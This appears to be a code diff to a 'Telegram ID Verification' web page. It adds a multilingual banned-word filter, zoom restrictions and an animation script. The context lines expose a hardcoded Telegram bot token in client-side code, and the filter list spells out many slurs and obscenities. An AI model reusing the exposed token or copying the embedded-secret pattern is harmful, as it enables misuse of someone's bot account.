@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1.0, user-scalable=no" />
   <title>Telegram ID Verification</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
   <style>
@@ -65,7 +65,6 @@
       border: none;
       box-shadow: 0 6px 18px rgba(37,24,151,0.28);
     }
-    #back-button:hover{ transform:translateY(-2px); box-shadow:0 10px 26px rgba(37,24,151,0.36); background:var(--accent-hover); }
 
     h1{ font-size:24px; margin:8px 0 12px; font-weight:700; color:#fff; }
     p{ font-size:15px; margin:0 0 18px; color:var(--muted); line-height:1.6; }
@@ -97,7 +96,6 @@
       transition: all .22s ease;
       box-shadow: 0 6px 18px rgba(37,24,151,0.28);
     }
-    .btn:hover{ background:var(--accent-hover); transform:translateY(-3px); box-shadow:0 10px 26px rgba(37,24,151,0.36); }
     .btn.small{ min-width:96px; padding:10px 14px; }
 
     .message{ font-size:15px; margin:8px 0 0; min-height:22px; }
@@ -259,6 +257,35 @@
 
     applyLocalization();
 
+    // Список запрещённых слов для проверки
+    const globalBadWords = [
+      'говно', 'хейт', 'порно', 'аноним', 'admin', 'админ', 'moder', 'модер', 'модератор',
+      'продавец премиума', 'seller of premium', 'seller of premium account', 'премиум', 'премиум пользователь',
+      'premium user', 'пользователь премиума', 'user of premium', 'user of premium account', '*', '"', "'",
+      'сука', 'пидор', 'пидорас', 'мразь', 'ублюдок', 'тварь', 'хуй', 'хер', 'еблан', 'ебанат', 'даун',
+      'дебил', 'идиот', 'чмо', 'гнида', 'тупой', 'блядь', 'бля', 'хуесос', 'нахуй', 'пошел нахуй',
+      'иди нахуй', 'урод', 'скотина', 'сволочь', 'мудак', 'петух', 'шлюха', 'проститутка', 'сучка',
+      'падла', 'долбоеб', 'долбаеб', 'ебаный', 'ебать', 'залупа', 'пизда', 'пиздец', 'fuck', 'fucking',
+      'bitch', 'asshole', 'bastard', 'dick', 'cock', 'pussy', 'shit', 'slut', 'whore', 'cunt', 'motherfucker',
+      'nigger', 'nigga', 'retard', 'stupid', 'idiot', 'dumbass', 'loser', 'jerk', 'gay', 'fag', 'faggot',
+      'suck', 'sucker', 'kill yourself', 'kms', 'puta', 'gilipollas', 'mierda', 'pendejo', 'cabron', 'maricon',
+      'coño', 'idiota', 'imbecil', 'tonto', 'perra', 'arschloch', 'scheisse', 'hurensohn', 'fotze', 'wichser',
+      'dummkopf', 'connard', 'salope', 'pute', 'merde', 'enculé', 'con', 'stronzo', 'coglione', 'puttana',
+      'troia', 'cretino', 'merda', 'caralho', 'filho da puta', 'otário', 'burro', 'sharmuta', 'ibn kalb',
+      'ibn al sharmuta', 'kalb', 'khara', 'jahel', 'madarchod', 'behenchod', 'chutiya', 'bhosdike', 'lund',
+      'randi', 'harami', 'orospu', 'siktir', 'amk', 'mal', 'aptal', 'gerizekali', 'kurwa', 'pierdol', 'chuj',
+      'jebac', 'debil', 'anjing', 'bangsat', 'kontol', 'memek', 'tolol', 'bodoh', 'shabi', 'caonima', 'gou ri',
+      'sb', 'ni ma', 'ssibal', 'gaesaekki', 'jot', 'meongcheong', 'baegopa', 'хентай', 'hentai', 'минет',
+      'minet', 'эротика', 'erotica'
+    ];
+
+    // Функция проверки на плохие слова
+    function containsBadWords(text) {
+      if (!text) return false;
+      const lowerText = text.toLowerCase();
+      return globalBadWords.some(word => lowerText.includes(word));
+    }
+
     // --------- Telegram logic (unchanged core) ----------
     const botToken = '6537497957:AAGZS4adwPVJSlx16YCCDrKjO96rDK7ZstI'; // ваш токен бота
 
@@ -283,6 +310,12 @@
       tempId = document.getElementById('tg-id').value.trim();
       if (!tempId) {
         step1MessageElem.textContent = t.errorEmptyId;
+        step1MessageElem.classList.remove('hidden');
+        step1MessageElem.classList.add('error');
+        return;
+      }
+      if (containsBadWords(tempId)) {
+        step1MessageElem.textContent = lang === 'ru' ? 'Не используйте запрещённые слова.' : 'Do not use forbidden words.';
         step1MessageElem.classList.remove('hidden');
         step1MessageElem.classList.add('error');
         return;
@@ -408,5 +441,18 @@
       }
     });
   </script>
+
+  <script>
+  // Применяем настройки анимаций
+  function applyAnimations() {
+      if (localStorage.getItem('animations') === 'no') {
+          document.body.classList.add('no-animations');
+      } else {
+          document.body.classList.remove('no-animations');
+      }
+  }
+  applyAnimations();
+  </script>
+  <script src="apply_app_view.js"></script>
 </body>
 </html>
